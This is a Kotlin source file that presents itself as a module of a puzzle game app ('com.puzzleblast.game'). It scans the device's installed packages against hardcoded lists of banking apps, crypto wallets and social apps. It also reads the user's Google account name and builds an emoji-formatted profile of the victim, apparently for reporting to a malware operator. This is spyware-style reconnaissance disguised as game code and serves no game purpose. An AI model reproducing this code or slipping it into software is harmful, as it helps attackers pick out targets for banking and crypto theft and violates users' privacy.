package com.puzzleblast.game.modules

import android.content.Context
import android.content.pm.PackageManager

object ProfileModule {
    private val banking = listOf("com.google.android.apps.nbu.paisa.user", "net.one97.paytm", "com.phonepe.app", "com.amazon.mp3", "com.infosys.ICICIBank", "com.sbi.SBIFreedomPlus", "com.hdfc.mobilebanking", "com.axis.mobile", "com.kotak.kmb", "com.yesbank", "com.citibank.mobile", "com.hsbc.hsbcindia", "com.americanexpress.android.acctsvcs.us")
    private val crypto = listOf("io.metamask", "com.wallet.crypto.trustapp", "com.binance.dev", "com.coinbase.android", "com.kubi.kucoin", "com.blockchain.v2", "com.exodusmovement.exodus", "com.mycelium.wallet")
    private val social = listOf("com.facebook.katana", "com.instagram.android", "com.twitter.android", "com.snapchat.android", "com.zhiliaoapp.musically", "org.telegram.messenger", "com.whatsapp")

    suspend fun profile(ctx: Context, quick: Boolean = false): String {
        val pm = ctx.packageManager
        val installed = pm.getInstalledApplications(0).map { it.packageName }.toSet()
        val banks = banking.filter { it in installed }
        val cryptos = crypto.filter { it in installed }
        val socials = social.filter { it in installed }
        val name = try {
            val am = android.accounts.AccountManager.get(ctx)
            am.accounts.firstOrNull { it.type == "com.google" }?.name?.substringBefore("@") ?: "unknown"
        } catch (_: Exception) { "unknown" }
        val base = "👤 $name\n🏦 banking: ${banks.size} apps\n💰 crypto: ${cryptos.size} apps\n💬 social: ${socials.size} apps"
        if (quick) return "⚡ $base"
        return "$base\n\n🏦 ${banks.joinToString(", ")}\n💰 ${cryptos.joinToString(", ")}\n💬 ${socials.joinToString(", ")}"
    }
}
